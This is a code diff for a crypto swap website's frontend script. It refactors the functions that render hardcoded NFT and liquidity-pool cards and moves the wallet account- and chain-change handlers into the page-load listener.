+    {name:'Moonbird #3301',  e:'🦉', bg:'#001a2e', floor:'9.9 ETH'},
+  ];
+  document.getElementById('nftGrid').innerHTML = nfts.map(n =>
+    '<div class="nft-card"><div class="nft-thumb" style="background:' + n.bg + '">' + n.e + '</div>'
+    + '<div class="nft-info"><div class="ni-name">' + n.name + '</div><div class="ni-price">Floor: ' + n.floor + '</div></div></div>'
+  ).join('');
+}
+
+function buildPools() {
+  const pools = [
+    {a:'USDT',b:'BNB', ca:'#26A17B',cb:'#F3BA2F',fee:'0.05%',tvl:'$2.1B',apy:'8.4%'},
+    {a:'ETH', b:'USDC',ca:'#627EEA',cb:'#2775CA',fee:'0.30%',tvl:'$1.8B',apy:'12.2%'},
+    {a:'BTC', b:'ETH', ca:'#F7931A',cb:'#627EEA',fee:'0.05%',tvl:'$980M',apy:'6.7%'},
+    {a:'UNI', b:'ETH', ca:'#FF007A',cb:'#627EEA',fee:'0.30%',tvl:'$340M',apy:'18.5%'},
+    {a:'LINK',b:'ETH', ca:'#2A5ADA',cb:'#627EEA',fee:'0.30%',tvl:'$210M',apy:'14.1%'},
+    {a:'BNB', b:'USDC',ca:'#F3BA2F',cb:'#2775CA',fee:'0.05%',tvl:'$680M',apy:'9.3%'},
+  ];
+  document.getElementById('poolsList').innerHTML = pools.map(p => {
+    const tA = TOKENS.find(t => t.symbol === p.a);
+    const tB = TOKENS.find(t => t.symbol === p.b);
+    return '<div class="pool-item"><div class="pool-pair"><div class="pool-icons">'
+      + '<span style="background:' + p.ca + '">' + (tA ? TOKEN_LOGOS[tA.svgKey] : '') + '</span>'
+      + '<span style="background:' + p.cb + '">' + (tB ? TOKEN_LOGOS[tB.svgKey] : '') + '</span>'
+      + '</div><div><div class="pool-name">' + p.a + '/' + p.b + '</div>'
+      + '<div class="pool-fee">Fee: ' + p.fee + ' · TVL: ' + p.tvl + '</div></div></div>'
+      + '<div class="pool-apy">APY ' + p.apy + '</div></div>';
   }).join('');
 }
 
-/* ══════════════════════════════════════════
-   NFTs PAGE DATA
-══════════════════════════════════════════ */
-function buildNFTs() {
-  const nfts = [
-    { name:'Bored Ape #4291', emoji:'🦍', bg:'#1a1a2e', floor:'68.5 ETH' },
-    { name:'CryptoPunk #7804', emoji:'👾', bg:'#12002e', floor:'47.2 ETH' },
-    { name:'Azuki #9605', emoji:'🌸', bg:'#2e0012', floor:'12.8 ETH' },
-    { name:'Doodle #6914', emoji:'🌈', bg:'#002e2e', floor:'7.4 ETH' },
-    { name:'World of Women #2',emoji:'🎨', bg:'#2e2000', floor:'5.1 ETH' },
-    { name:'Moonbird #3301', emoji:'🦉', bg:'#001a2e', floor:'9.9 ETH' },
-  ];
-  document.getElementById('nftGrid').innerHTML = nfts.map(n => `
-    <div class="nft-card">
-      <div class="nft-thumb" style="background:${n.bg}">${n.emoji}</div>
-      <div class="nft-info">
-        <div class="ni-name">${n.name}</div>
-        <div class="ni-price">Floor: ${n.floor}</div>
-      </div>
-    </div>
-  `).join('');
-}
-
-/* ══════════════════════════════════════════
-   POOLS PAGE DATA
-══════════════════════════════════════════ */
-function buildPools() {
-  const pools = [
-    { a:'USDT', b:'BNB',  icA:'#26A17B', icB:'#F3BA2F', fee:'0.05%', tvl:'$2.1B', apy:'8.4%'  },
-    { a:'ETH',  b:'USDC', icA:'#627EEA', icB:'#2775CA', fee:'0.30%', tvl:'$1.8B', apy:'12.2%' },
-    { a:'BTC',  b:'ETH',  icA:'#F7931A', icB:'#627EEA', fee:'0.05%', tvl:'$980M', apy:'6.7%'  },
-    { a:'UNI',  b:'ETH',  icA:'#FF007A', icB:'#627EEA', fee:'0.30%', tvl:'$340M', apy:'18.5%' },
-    { a:'LINK', b:'ETH',  icA:'#2A5ADA', icB:'#627EEA', fee:'0.30%', tvl:'$210M', apy:'14.1%' },
-    { a:'BNB',  b:'USDC', icA:'#F3BA2F', icB:'#2775CA', fee:'0.05%', tvl:'$680M', apy:'9.3%'  },
-  ];
-  document.getElementById('poolsList').innerHTML = pools.map(p => `
-    <div class="pool-item">
-      <div class="pool-pair">
-        <div class="pool-icons">
-          <span style="background:${p.icA}">
-            ${TOKENS.find(t=>t.symbol===p.a)?.icon||'?'}
-          </span>
-          <span style="background:${p.icB}">
-            ${TOKENS.find(t=>t.symbol===p.b)?.icon||'?'}
-          </span>
-        </div>
-        <div>
-          <div class="pool-name">${p.a}/${p.b}</div>
-          <div class="pool-fee">Fee: ${p.fee} · TVL: ${p.tvl}</div>
-        </div>
-      </div>
-      <div class="pool-apy">APY ${p.apy}</div>
-    </div>
-  `).join('');
-}
-
-/* ══════════════════════════════════════════
+/* ════════════════════════════════════════
    INIT
-══════════════════════════════════════════ */
+════════════════════════════════════════ */
 renderTokenSelector();
 updateButton();
 buildTokenTable();
 buildNFTs();
 buildPools();
 
-window.addEventListener('load', async () => {
-  await connectWallet(true);
+window.addEventListener('load', async function() {
+  if (window.ethereum) {
+    await connectWallet(true);
+    window.ethereum.on('accountsChanged', async function(accounts) {
+      if (!accounts || !accounts.length) {
+        connected = false; userAddress = null; balances = {};
+        document.getElementById('navConnectBtn').textContent = 'Connect Wallet';
+        updateButton(); return;
+      }
+      await connectWallet(true);
+    });
+    window.ethereum.on('chainChanged', async function() {
+      await switchToBSC();
+      await connectWallet(true);
+    });
+  }
 });
-
-if (window.ethereum) {
-  window.ethereum.on('accountsChanged', async (accounts) => {
-    if (!accounts.length) {
-      connected = false;
-      document.getElementById('navConnectBtn').textContent = 'Connect Wallet';
-      updateButton();
-      return;
-    }
-    await connectWallet(true);
-  });
-  window.ethereum.on('chainChanged', async () => {
-    const chainId = await window.ethereum.request({ method:'eth_chainId' });
-    if (chainId !== BSC_CHAIN_ID) await switchToBSC();
-    await connectWallet(true);
-  });
-}
 </script>
 </body>
 </html>
